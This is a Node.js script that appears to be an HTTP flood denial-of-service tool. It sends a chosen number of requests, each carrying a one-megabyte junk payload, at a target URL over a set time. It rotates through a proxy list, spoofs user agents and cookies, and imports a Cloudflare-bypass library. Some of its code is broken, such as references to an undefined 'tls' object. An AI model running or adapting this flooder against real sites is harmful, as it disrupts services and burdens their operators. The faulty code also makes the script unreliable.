const http = require('http');
const https = require('tls');
const fs = require('fs');
const cloudscraper = require('cloudscraper');
const HttpsProxyAgent = require('https-proxy-agent');

let server = process.argv[2];
let sec = process.argv[3];
let proxy = process.argv[4];
let method = process.argv[5];
let requests = process.argv[6];
let userAgent = process.argv[7];
let cookies = process.argv[8];
let tlsMethod = process.argv[9];

if (!server || !sec || !requests) {
    console.log('Missing required arguments: server, sec, requests');
    process.exit();
}

let proxyList;
if (proxy) {
    proxyList = fs.readFileSync(proxy).toString().split('\n');
}

let counter = 0;
let intervalId;

const options = {
    host: new URL(server).hostname,
    method: method.toUpperCase() || 'GET',
    path: server,
    headers: {
        'User-Agent': userAgent || 'Node.js Http Client'
    },
    secureOptions: tls.constants[tlsMethod] || tls.constants.SSL_OP_NO_TLSv1_2,
};

if(cookies){
    options.headers.Cookie = cookies;
}

const payload = "a".repeat(1000000); // large payload
options.headers['Content-Length'] = payload.length;

const request = (options, proxy) => {
    if (proxy) {
        let proxyUrl = new URL(`http://${proxy}`);
        options.agent = new HttpsProxyAgent({
            host: proxyUrl.hostname,
            port: proxyUrl.port,
        });
    }

    let req = https.request(options, res => {
        res.setEncoding('utf8');
        res.on('data', () => { });
        res.on('end', () => {
            counter++;
        });
    });
    req.on("error", (e) => {
        console.error("error: " + e);
    });
    req.write(payload);
    req.end();
};

console.log(`Sending ${requests} ${options.method} requests to ${server} with large payloads over ${sec} seconds`);

intervalId = setInterval(() => {
    if (counter >= requests) {
        clearInterval(intervalId);
        console.log('Successful');
        process.exit();
    }

    if (proxyList) {
        let proxyServer = proxyList[Math.floor(Math.random() * proxyList.length)];
        request(options, proxyServer);
    } else {
        request(options);
    }
}, 1000 * sec / requests);

process.stdin.resume();
process.stdin.on('data', function (data) {
    if (data.toString().trim() === 'stop') {
        clearInterval(intervalId);
        process.exit();
    }
});
